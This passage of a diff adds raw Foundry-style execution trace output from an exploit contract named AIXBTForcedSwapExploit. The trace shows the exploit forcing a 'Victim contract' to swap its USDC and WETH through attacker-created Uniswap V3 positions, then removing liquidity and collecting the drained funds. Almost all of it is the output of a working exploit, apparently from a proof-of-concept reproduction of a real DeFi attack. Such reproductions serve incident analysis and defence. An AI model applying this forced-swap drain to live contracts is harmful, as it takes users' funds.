+    │   │   │   │   │   │   │   ├─ [31128] USDC::transferFrom(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, 6002760000 [6.002e9])
+    │   │   │   │   │   │   │   │   ├─ [30454] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transferFrom(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, 6002760000 [6.002e9]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], to: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, value: 6002760000 [6.002e9])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x6c4fed92ca9f0bd42c6ddae7595518c127cd4314b141d018ac5cbb51bca42903: 0x0000000000000000000000000000000000000000000000000000000165cad940 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x0cfbf3a5666de8e7a8ce8374fb87ffb6e13cb8c8dab13ac449ea969057a0cbef: 0 → 0x0000000000000000000000000000000000000000000000000000000165cad940
+    │   │   │   │   │   │   │   │   │   │   @ 0x7cced592eb34a5130387e3ccefde2a4454fbd19adba3829b27a7ffd8e2ac3631: 0x0000000000000000000000000000000000000000000000000000000165cad940 → 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [1250] USDC::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6002760000 [6.002e9]
+    │   │   │   │   │   │   │   └─ ← [Return] 6002760000 [6.002e9]
+    │   │   │   │   │   │   ├─ emit Swap(sender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], recipient: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, deltaQty0: -6002159723 [-6.002e9], deltaQty1: 6002760000 [6.002e9], sqrtP: 79228162514501502372511651466 [7.922e28], liquidity: 2005104164790028032878 [2.005e21], currentTick: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0: 0x0001000001000100000000000000000000000001000000000000000000000000 → 0x000100000100010000000000000000000000000100000000034a941c239a968a
+    │   │   │   │   │   │   │   @ 2: 0 → 0x000000000000000000000000000000000000000000001592799d9ff449b423a3
+    │   │   │   │   │   │   └─ ← [Return] -6002159723 [-6.002e9], 6002760000 [6.002e9]
+    │   │   │   │   │   └─ ← [Return] 6002159723 [6.002e9]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [110506] Uniswap V3 position manager::decreaseLiquidity(DecreaseLiquidityParams({ tokenId: 1944699 [1.944e6], liquidity: 2005104164790028032878 [2.005e21], amount0Min: 0, amount1Min: 0, deadline: 1737909059 [1.737e9] }))
+    │   │   │   │   ├─ [59662] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::burn(0, 100, 2005104164790028032878 [2.005e21])
+    │   │   │   │   │   ├─ emit Burn(owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], tickLower: 0, tickUpper: 100, qty: 2005104164790028032878 [2.005e21], qty0: 9999999993997840276 [9.999e18], qty1: 6002159723 [6.002e9])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xad66b8e7ab72f450ddfdaf1c5bc10e3a3fabf9f63ad8aa07b8743b93722f0a48: 0x0100000000000000000000000000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000006cb268fe611ded5b6e → 0
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bf: 0x0167966343000000000000000000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   │   @ 0x8bb3b82bc56c3742e93c4dfa52614def9ee73bf9affdf902ecfd8b70520b12d8: 0x00000000000000000000000000000000000000000000006cb268fe611ded5b6e → 0
+    │   │   │   │   │   │   @ 0xad66b8e7ab72f450ddfdaf1c5bc10e3a3fabf9f63ad8aa07b8743b93722f0a45: 0xffffffffffffff934d97019ee212a492000000000000006cb268fe611ded5b6e → 0
+    │   │   │   │   │   │   @ 0x8bb3b82bc56c3742e93c4dfa52614def9ee73bf9affdf902ecfd8b70520b12da: 0 → 0x000000000000000000000000000000000000000000001592799d9ff449b423a3
+    │   │   │   │   │   │   @ 0x8bb3b82bc56c3742e93c4dfa52614def9ee73bf9affdf902ecfd8b70520b12db: 0 → 0x00000000000000000000000165cad93e00000000000000008ac7230324264f94
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bc: 0x000000000000006cb268fe611ded5b6e000000000000006cb268fe611ded5b6e → 0
+    │   │   │   │   │   │   @ 0x54cdd369e4e8a8515e52ca72ec816c2101831ad1f18bf44102ed171459c9b4f8: 0x0000000000000000000000000000000000000010000000000000000000000001 → 0
+    │   │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18], 6002159723 [6.002e9]
+    │   │   │   │   ├─ [1013] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::positions(0x7280365d5e2db2d8939f53fd23fa149d391091f6e23e1cedf7216b575322ecb6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0, 0, 101871684111345634255779 [1.018e23], 9999999993997840276 [9.999e18], 6002759998 [6.002e9]
+    │   │   │   │   ├─ emit DecreaseLiquidity(tokenId: 1944699 [1.944e6], liquidity: 2005104164790028032878 [2.005e21], amount0: 9999999993997840276 [9.999e18], amount1: 6002159723 [6.002e9])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x47887fe4b21ae31435861356eb29055568dc180fd13d9d6c18106c95072982d8: 0 → 0x000000000000000000000000000000000000000000001592799d9ff449b423a3
+    │   │   │   │   │   @ 0x47887fe4b21ae31435861356eb29055568dc180fd13d9d6c18106c95072982d6: 0x000000000000006cb268fe611ded5b6e00006400000000000000000000026584 → 0x0000000000000000000000000000000000006400000000000000000000026584
+    │   │   │   │   │   @ 0x47887fe4b21ae31435861356eb29055568dc180fd13d9d6c18106c95072982d9: 0 → 0x00000000000000000000000165cad93e00000000000000008ac7230324264f94
+    │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18], 6002159723 [6.002e9]
+    │   │   │   ├─ [67967] Uniswap V3 position manager::collect(CollectParams({ tokenId: 1944699 [1.944e6], recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amount0Max: 340282366920938463463374607431768211455 [3.402e38], amount1Max: 340282366920938463463374607431768211455 [3.402e38] }))
+    │   │   │   │   ├─ [60326] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::collect(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 100, 9999999993997840276 [9.999e18], 6002759998 [6.002e9])
+    │   │   │   │   │   ├─ [25738] AIXBT::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 9999999993997840276 [9.999e18])
+    │   │   │   │   │   │   ├─ [25560] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 9999999993997840276 [9.999e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 9999999993997840276 [9.999e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xb179bed1e4e93319112ce6ac26b0c7e20070d1b4977440a7d59ca95c1e16d5b2: 0x0000000000000000000000000000000000000000000000008ac7230324264f95 → 1
+    │   │   │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0 → 0x0000000000000000000000000000000000000000000000008ac7230324264f94
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [27263] USDC::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6002759998 [6.002e9])
+    │   │   │   │   │   │   ├─ [26563] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6002759998 [6.002e9]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 6002759998 [6.002e9])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x0cfbf3a5666de8e7a8ce8374fb87ffb6e13cb8c8dab13ac449ea969057a0cbef: 0x0000000000000000000000000000000000000000000000000000000165cad940 → 2
+    │   │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0 → 0x0000000000000000000000000000000000000000000000000000000165cad93e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ emit Collect(owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tickLower: 0, tickUpper: 100, amount0: 9999999993997840276 [9.999e18], amount1: 6002759998 [6.002e9])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8bb3b82bc56c3742e93c4dfa52614def9ee73bf9affdf902ecfd8b70520b12db: 0x00000000000000000000000165cad93e00000000000000008ac7230324264f94 → 0
+    │   │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18], 6002759998 [6.002e9]
+    │   │   │   │   ├─ emit Collect(tokenId: 1944699 [1.944e6], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: 9999999993997840276 [9.999e18], amount1: 6002759998 [6.002e9])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x47887fe4b21ae31435861356eb29055568dc180fd13d9d6c18106c95072982d9: 0x00000000000000000000000165cad93e00000000000000008ac7230324264f94 → 0
+    │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18], 6002759998 [6.002e9]
+    │   │   │   ├─ [849] AIXBT::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18]
+    │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18]
+    │   │   │   ├─ [458417] Uniswap V3 position manager::mint(MintParams({ token0: 0x4200000000000000000000000000000000000006, token1: 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825, fee: 100, tickLower: -100, tickUpper: 0, amount0Desired: 0, amount1Desired: 9999999993997840276 [9.999e18], amount0Min: 0, amount1Min: 0, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, deadline: 1737909059 [1.737e9] }))
+    │   │   │   │   ├─ [696] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::slot0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 79228162514264337593543950336 [7.922e28], 0, 0, 1, 1, 0, true
+    │   │   │   │   ├─ [229375] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::mint(Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], -100, 0, 2005104163586532486845 [2.005e21], 0x00000000000000000000000042000000000000000000000000000000000000060000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a82500000000000000000000000000000000000000000000000000000000000000640000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   │   │   ├─ [2849] AIXBT::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [staticcall]
+    │   │   │   │   │   │   ├─ [2677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [31396] Uniswap V3 position manager::uniswapV3MintCallback(0, 9999999993997840276 [9.999e18], 0x00000000000000000000000042000000000000000000000000000000000000060000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a82500000000000000000000000000000000000000000000000000000000000000640000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   │   │   │   ├─ [28207] AIXBT::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, 9999999993997840276 [9.999e18])
+    │   │   │   │   │   │   │   ├─ [28023] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, 9999999993997840276 [9.999e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, value: 9999999993997840276 [9.999e18])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0x0000000000000000000000000000000000000000000000008ac7230324264f94 → 0
+    │   │   │   │   │   │   │   │   │   @ 0xb5ae290dd1017f895f82e1b86f6350af72a7a6438e213d91c05c13d41e59d8f4: 0 → 0x0000000000000000000000000000000000000000000000008ac7230324264f94
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [849] AIXBT::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [staticcall]
+    │   │   │   │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18]
+    │   │   │   │   │   │   └─ ← [Return] 9999999993997840276 [9.999e18]
+    │   │   │   │   │   ├─ emit Mint(sender: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], tickLower: -100, tickUpper: 0, qty: 2005104163586532486845 [2.005e21], qty0: 0, qty1: 9999999993997840276 [9.999e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bf: 0 → 0x0167966343000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   @ 0x7733a14d9b6f4bc9fa392b7954a5ed168b3ef3cc0ebe2549bf5ab1b74cfdca07: 0 → 0x000000000000006cb268fd48e800aebd000000000000006cb268fd48e800aebd
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bc: 0 → 0xffffffffffffff934d9702b717ff5143000000000000006cb268fd48e800aebd
+    │   │   │   │   │   │   @ 0xae2d21d24d11f0b73917b07cba5372aaf49a7303580b69ac0d8195e5e0ecdd00: 0 → 0x00000000000000000000000000000000000000000000006cb268fd48e800aebd
+    │   │   │   │   │   │   @ 0x63187d71e139eee983a88d0737447c7451979b3dbb75903c76b5fe430d36588e: 0 → 0x0000000000000000000000001000000000000000000000000000000000000000
+    │   │   │   │   │   │   @ 0x54cdd369e4e8a8515e52ca72ec816c2101831ad1f18bf44102ed171459c9b4f8: 0 → 1
+    │   │   │   │   │   │   @ 0x7733a14d9b6f4bc9fa392b7954a5ed168b3ef3cc0ebe2549bf5ab1b74cfdca0a: 0 → 0x0167966343000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0, 9999999993997840276 [9.999e18]
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 1944700 [1.944e6])
+    │   │   │   │   ├─ [1013] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::positions(0x1dc0994566c2842a9f5e15e5b9774e1fe9dd5ad5e4b2d883a038cdd7e270cc8d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2005104163586532486845 [2.005e21], 0, 0, 0, 0
+    │   │   │   │   ├─ emit IncreaseLiquidity(tokenId: 1944700 [1.944e6], liquidity: 2005104163586532486845 [2.005e21], amount0: 0, amount1: 9999999993997840276 [9.999e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x06824509824cfcf81631cca3c1204ede348b989ca5c830ee08d42e21e3a07ddb: 0 → 0x0000000000000000000000644f9fd6be4a90f2620860d680c0d4d5fb53d1a825
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 1 → 2
+    │   │   │   │   │   @ 0x06824509824cfcf81631cca3c1204ede348b989ca5c830ee08d42e21e3a07dda: 0 → 0x0000000000000000000000004200000000000000000000000000000000000006
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3f26bb3: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000000000000000001b8872 → 0x00000000000000000000000000000000000000000000000000000000001b8873
+    │   │   │   │   │   @ 13: 0x00000000000000026585000000000000000000000000000000000000001dac7c → 0x00000000000000026586000000000000000000000000000000000000001dac7d
+    │   │   │   │   │   @ 0x4e50448b3aa311118052b10f4ee67d43cad5b8d903fd9802242390017a7af17e: 0 → 0x00000000000000000000000000000000000000000000000000000000001dac7c
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3f26bb2: 0 → 0x00000000000000000000000000000000000000000000000000000000001dac7c
+    │   │   │   │   │   @ 0x0d415a7e413cf5129bb1aa8419e4f74a9ec7ee2c5dcfcd0805c3ff8e2fbed49e: 0 → 0x00000000000000000000000000000000000000000000000000000000001b8873
+    │   │   │   │   │   @ 0xb5ae290dd1017f895f82e1b86f6350af72a7a6438e213d91c05c13d41e59d8f4: 0 → 157061
+    │   │   │   │   │   @ 0x0670f4c9f47719943e83bb00037b25e87bf657f2a3bfe5ccc5c6dbb7f81a29b8: 0 → 0x000000000000006cb268fd48e800aebd000000ffff9c00000000000000026585
+    │   │   │   │   │   @ 0x9b2e97023c0a418e38464b4c8fc7072464058c445270f68659b4a6ecba81af3a: 0 → 2
+    │   │   │   │   └─ ← [Return] 1944700 [1.944e6], 2005104163586532486845 [2.005e21], 0, 9999999993997840276 [9.999e18]
+    │   │   │   ├─ [2457] WETH::balanceOf(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2302947556164439286 [2.302e18]
+    │   │   │   ├─ [143950] Victim contract::229e9756(be152e386e99b9ecd50432823c89dc975e941f17cff5b2908f66a85b331a843400000000000000000000000042000000000000000000000000000000000000060000000000000000000000000000000000000000000000001ff5b699cd890cf60000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [24399] WETH::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 2302947556164439286 [2.302e18])
+    │   │   │   │   │   ├─ emit Approval(owner: Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], spender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], value: 2302947556164439286 [2.302e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xfac6d3ff10d89050b8ec2615ea760edd4ecd2248cda74d8746f0ac63007378c7: 0 → 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf6
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [111341] Uniswap V3 swap router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x4200000000000000000000000000000000000006, tokenOut: 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825, fee: 100, recipient: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, amountIn: 2302947556164439286 [2.302e18], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   │   ├─ [106445] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::swap(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, true, 2302947556164439286 [2.302e18], 4295128740 [4.295e9], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000032cd8541ccd275a70dda33a9fd490d948a78e1ff000000000000000000000000000000000000000000000000000000000000002b42000000000000000000000000000000000000060000644f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [5838] AIXBT::transfer(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, 2300075790545800624 [2.3e18])
+    │   │   │   │   │   │   │   ├─ [5660] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, 2300075790545800624 [2.3e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, to: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, value: 2300075790545800624 [2.3e18])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xb5ae290dd1017f895f82e1b86f6350af72a7a6438e213d91c05c13d41e59d8f4: 0x0000000000000000000000000000000000000000000000008ac7230324264f94 → 0x0000000000000000000000000000000000000000000000006adba044603101e4
+    │   │   │   │   │   │   │   │   │   @ 0xe6532b96bd7bb64ea405995602530f9162ecea7b7abc4ce276ddfb5485ae3b9e: 0x0000000000000000000000000000000000000000000000000000000165c1b06b → 0x0000000000000000000000000000000000000000000000001feb82c029b6fe1b
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [2457] WETH::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [30693] Uniswap V3 swap router::uniswapV3SwapCallback(2302947556164439286 [2.302e18], -2300075790545800624 [-2.3e18], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000032cd8541ccd275a70dda33a9fd490d948a78e1ff000000000000000000000000000000000000000000000000000000000000002b42000000000000000000000000000000000000060000644f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   │   ├─ [26600] WETH::transferFrom(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, 2302947556164439286 [2.302e18])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], to: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, value: 2302947556164439286 [2.302e18])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x3a794b5ac4f8c0ce28df2a8bb09ca89eb9bba66663d8186f3431781bd1e10157: 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf6 → 0
+    │   │   │   │   │   │   │   │   │   @ 0xc8c5ec261a32bfe85b2205630de4faf4edad1c47b6f4f09849ae3f2c0cdb9c65: 0 → 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf6
+    │   │   │   │   │   │   │   │   │   @ 0xfac6d3ff10d89050b8ec2615ea760edd4ecd2248cda74d8746f0ac63007378c7: 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf6 → 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2302947556164439286 [2.302e18]
+    │   │   │   │   │   │   ├─ emit Swap(sender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], recipient: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, deltaQty0: 2302947556164439286 [2.302e18], deltaQty1: -2300075790545800624 [-2.3e18], sqrtP: 79137279066991188812590663436 [7.913e28], liquidity: 2005104163586532486845 [2.005e21], currentTick: -23)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000006cb268fd48e800aebd
+    │   │   │   │   │   │   │   @ 1: 0 → 0x00000000000000000000000000000000000001ed4b984137538effcc67940fd1
+    │   │   │   │   │   │   │   @ 0: 0x0001000001000100000000000000000000000001000000000000000000000000 → 0x000100000100010000ffffe90000000000000000ffb4d2ae738023e6c0f6c70c
+    │   │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bf: 0x0167966343000000000000000000000000000000000000000000000000000000 → 0x0100000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 2302947556164439286 [2.302e18], -2300075790545800624 [-2.3e18]
+    │   │   │   │   │   └─ ← [Return] 2300075790545800624 [2.3e18]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [110437] Uniswap V3 position manager::decreaseLiquidity(DecreaseLiquidityParams({ tokenId: 1944700 [1.944e6], liquidity: 2005104163586532486845 [2.005e21], amount0Min: 0, amount1Min: 0, deadline: 1737909059 [1.737e9] }))
+    │   │   │   │   ├─ [59593] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::burn(-100, 0, 2005104163586532486845 [2.005e21])
+    │   │   │   │   │   ├─ emit Burn(owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], tickLower: -100, tickUpper: 0, qty: 2005104163586532486845 [2.005e21], qty0: 2302717261408822841 [2.302e18], qty1: 7699924203452039651 [7.699e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bc: 0xffffffffffffff934d9702b717ff5143000000000000006cb268fd48e800aebd → 0
+    │   │   │   │   │   │   @ 0x63187d71e139eee983a88d0737447c7451979b3dbb75903c76b5fe430d36588e: 0x0000000000000000000000001000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   │   @ 0x54cdd369e4e8a8515e52ca72ec816c2101831ad1f18bf44102ed171459c9b4f8: 1 → 0
+    │   │   │   │   │   │   @ 0xae2d21d24d11f0b73917b07cba5372aaf49a7303580b69ac0d8195e5e0ecdd03: 0 → 0x00000000000000006adba044603101e300000000000000001ff5b699cd890cf4
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bf: 0x0100000000000000000000000000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   │   @ 0x7733a14d9b6f4bc9fa392b7954a5ed168b3ef3cc0ebe2549bf5ab1b74cfdca07: 0x000000000000006cb268fd48e800aebd000000000000006cb268fd48e800aebd → 0
